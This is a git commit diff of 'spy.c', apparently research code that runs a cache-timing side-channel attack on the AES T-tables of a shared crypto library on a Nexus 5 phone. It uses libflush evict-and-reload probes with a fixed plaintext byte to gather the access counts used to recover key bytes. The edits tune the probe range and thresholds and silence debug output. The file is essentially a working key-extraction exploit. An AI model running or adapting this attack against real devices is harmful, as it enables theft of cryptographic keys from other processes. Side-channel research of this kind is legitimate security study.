3b52d35f761d0565e70225f1ff2061482342713e
pg2527 <parulgupta.mbmj@gmail.com>
2017-03-28 11:32:55 +0200

    final spy file

--- lib/aes/jni/spy.c
+++ lib/aes/jni/spy.c
@@ -21,8 +21,8 @@
 #define NUMBER_OF_ENCRYPTIONS2 (12000)
 #define MAP_SIZE 4096
 // this number varies on different systems
-#define MIN_CACHE_MISS_CYCLES (110)
-#define THRESHOLD (250)
+#define MIN_CACHE_MISS_CYCLES (110)           /*x-86*/
+#define THRESHOLD (250)                       /*armv7-----Nexus-5*/
 #define CPU 0
 
 struct cache_map{
@@ -50,7 +50,7 @@ unsigned char key[] =
 
 size_t sum;
 size_t scount;
-struct cache_map timings[128];
+struct cache_map timings[192];
 char* base;
 char* probe;
 char* end;
@@ -71,16 +71,20 @@ int main()
     map_size |= 0xFFF;
     map_size += 1;
   }
+  /*Mapping the shared library with read and execute permissions*/
+  
   base = (char*) mmap(0, map_size, PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
   end = base + size;
  // getchar();
   //tmp = base + 0x14f45c;
  // tmp_end = tmp + 0x1000;
   //volatile unsigned int *p = (volatile unsigned int *)tmp;
+ 
+ /*Checking if the library is mapped correctly*/  
+  
   printf("The address from where library is mapped : %p\n",base);
   int i =0;
-//struct cache_map new_map[48];
- 
+
      
   unsigned char plaintext[] =
   {
@@ -90,11 +94,12 @@ int main()
   unsigned char ciphertext[128];
   unsigned char restoredtext[128];
   
-  
+  /* Libflush context */
   libflush_session_t* libflush_session;
   AES_KEY key_struct;
   AES_set_encrypt_key(key, 128, &key_struct);
   
+  /*Setting the timers*/
   struct timespec time = {0,0};
   struct timespec time_seed = {0,0};
   struct timespec time2 ={0,0};
@@ -106,9 +111,10 @@ int main()
   
   libflush_init(&libflush_session, NULL);
   size_t sets = libflush_get_number_of_sets(libflush_session);
+ 
   /*Counting the number of active cpus on my system */
   size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
-  printf("Number of active cpus %zu\n",number_of_cpus);
+  printf("<1>Number of active cpus %zu\n",number_of_cpus);
   cpu_set_t mask;
   pid_t current_process = getpid();
    /* CPU_ZERO initializes all the bits in the mask to zero. */
@@ -121,7 +127,7 @@ int main()
    {
       printf("WARNING: Could not set CPU Affinity, continuing...\n");}
       else{
-		  printf("<1>The affinity has been set..\n");
+		  printf("<2>The affinity has been set..\n");
 	  }
  
   printf("The number of sets in Nexus 5 are %zu\n", sets);
@@ -132,20 +138,21 @@ int main()
     {
      plaintext[0]=byte;
      size_t set_index;
-    
-     printf("The 0th byte of plaintext has been set to %zu\n",plaintext[0]);
+    // printf("The 0th byte of plaintext has been set to %zu\n",plaintext[0]);
      AES_encrypt(plaintext, ciphertext, &key_struct);
    //  getchar();
      
 /* Probing the T-table elements*/
-  for (probe =(base + 0x14f45c); probe < (base + 0x14f65c); probe += 64) // 64: Cache-line size    
+  for (probe =(base + 0x14f45c); probe < (base + 0x14F75C); probe += 64) // 64: Cache-line size    
       {	
 	  int j=0;
 	  set_index=libflush_get_set_index(libflush_session,probe);		
-	  printf("\nThe value of probe's set index is %zu\n",set_index);
+	/*  printf("\nThe value of probe's set index is %zu\n",set_index);
+	
 	  volatile unsigned int *p = (volatile unsigned int *)probe;
 	  for(i=0;i<4;i++) 
 			printf("%02x\n",*(probe+3-i));
+      */
        //getchar();
        size_t count = 0;
        size_t delta_sum = 0;
@@ -157,17 +164,22 @@ int main()
           for (size_t j = 1; j < 16; ++j)
              {
 			   plaintext[j] = rand() % 256;}
-		/*1st encryption round  */
+			   
+		/* Warm-up round :1st AES encryption round  */
+		
        AES_encrypt(plaintext,ciphertext,&key_struct);
-		/* 2nd Encryption round */
+       
+		/* 2nd  AES Encryption round */
 	   //size_t timer1 = get_cycle_count();
 	   clock_gettime(CLOCK_MONOTONIC, &time);
        AES_encrypt(plaintext,ciphertext,&key_struct);
        clock_gettime(CLOCK_MONOTONIC, &time2);
        //size_t timer2 = get_cycle_count();
-        /*Evicting an address*/
+       
+        /*Evicting an address under probe*/
         size_t time_evict = libflush_reload_address_and_evict(libflush_session,probe);
-       /*3rd encryption round*/
+      
+       /*3rd  AES encryption round*/
         clock_gettime(CLOCK_MONOTONIC, &time3);
         //size_t timer3 = get_cycle_count();
         AES_encrypt(plaintext,ciphertext,&key_struct);
@@ -175,9 +187,10 @@ int main()
         clock_gettime(CLOCK_MONOTONIC, &time4);
         size_t probe_timer_start = libflush_reload_address(libflush_session, probe);
        // size_t delta_aes2 = (timer4-timer3)-(timer2-timer1); 
-       size_t delta_aes2 = (time4.tv_nsec-time3.tv_nsec)-(time2.tv_nsec-time.tv_nsec); 
+        size_t delta_aes2 = (time4.tv_nsec-time3.tv_nsec)-(time2.tv_nsec-time.tv_nsec); 
         if (probe_timer_start < THRESHOLD)
           ++count;
+	  /*
 	   fprintf(stdout, "\n Timings for AES at first time at %p is %ld \n",probe,(time2.tv_nsec-time.tv_nsec));
 	   fprintf(stdout, "\n Timings for AES at  second time %p is %ld \n",probe,(time4.tv_nsec-time3.tv_nsec));
 	  	 //fprintf(stdout, "\n Timings for AES at  first time %p is %zu \n",probe,(timer2-timer1));
@@ -186,10 +199,12 @@ int main()
 	      printf("\nTime to access data first time at %p:%zu\n",probe, time_evict);
           printf("\nTime to access evicted data at %p:%zu\n",probe, probe_timer_start);
 		  printf("\nTime-difference between 2nd & 3rd AES\t %zu\n",delta_aes2);
+		*/
 		}
 		
-		fprintf(stdout, "\n Address:%p \t Byte:%zu \t Count:%zu\n",probe,byte,count);
-		printf("Flag : %d\n\n\n\n\n\n\n\n",flag);
+		//fprintf(stdout, "\n Address:%p \t Byte:%zu \t Count:%zu\n",probe,byte,count);
+		
+	//	printf("Flag : %d\n\n\n\n\n\n\n\n",flag);
 		timings[flag].entry=count;
 		timings[flag].map_element=probe;
 		timings[flag].byte_entry =byte;
@@ -200,16 +215,20 @@ int main()
     } 
   }
   
- for(i=0;i<128;i++)
+ for(i=0;i<192;i++)
   {
   printf("%zu:\t%p\t%zu\t\n",timings[i].byte_entry,timings[i].map_element,timings[i].entry);
 }
 printf("\n");
 int num=0;
-for(num=0;num<128;num++)
+char* tmp_var;
+for(num=0;num<192;num++)
 {  
-	if((num%8)==0)
-    	{printf("\n");
+	if((num%12)==0)
+    	{	printf("\n");
+			//printf("%p\t",(timings[num].map_element));
+			
+			
     	}
 	else
 	   {
@@ -220,7 +239,6 @@ printf("\n");
 
    /* Terminate libflush */
   libflush_terminate(libflush_session);
-  
   close(fd);
   munmap(base, map_size);
   fflush(stdout);
@@ -262,6 +280,6 @@ static inline void dcache_clean(void)
      __asm volatile ("1: mrc p15, 0, r15, c7, c10, 3\n"
                      " bne 1b\n" ::: "cc");
      /* drain the write buffer */
-   // __asm volatile ("mcr 15, 0, %0, c7, c10, 4"::"r" (zero));
+     __asm volatile ("mcr 15, 0, %0, c7, c10, 4"::"r" (zero));
  }
 
